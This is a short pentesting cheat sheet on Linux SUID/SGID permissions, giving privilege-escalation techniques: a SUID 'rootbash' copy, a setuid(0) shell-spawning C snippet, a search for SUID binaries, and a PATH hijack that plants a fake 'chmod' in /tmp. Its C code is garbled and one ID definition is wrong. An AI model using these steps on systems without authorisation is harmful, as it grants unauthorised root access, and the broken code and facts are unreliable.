# SUID

## **Setuid \(SUID\)**

If SUID is set, the file will be executed with the privilege of the file user.

## **Setgid \(SGID\)**

File: the file will be executed with the privilege of the filegroup. Directory: files created within that dir will inherit group privilege.

These permissions are represented by the 'execute' part, and when set it will be 's'.

Each User has 3 user ids:

* Real id: UID
* EffectiveID: EUID
* SavedID: GID

### Usages

#### Rootbash SUID:

Copy of `/bin/bash` as `rootbash`, and make sure it's owned by root and suid is set.

Now it can be executed as `rootbash -p`

Custom:

```text
Init main() {
	Setuid(0);
	System("/bin/bash" -p)
}

#Compile
Gcc -o <name> <code_filename.c>
```

#### Find files by permissions type

`find / -perm -u=s -type f 2>/dev/null`

`./some-binary`

#### Using SUID "_where"_

1. Where root login is required to execute some commands/programs/scripts. 
2. Where you don’t want to give credentials of a particular user but want to run some programs as the owner.
3. Where you don’t want to use SUDO command but want to give execute permission for a file/script etc.

_**If there is any execution we may be able to gain root access by exploiting PATH variable.**_

```text
cd /tmp
echo '/bin/bash' > chmod
chmod 777 chmod
echo $PATH
export PATH=/tmp:$PATH
cd /usr/local/bin
./some-binary
```

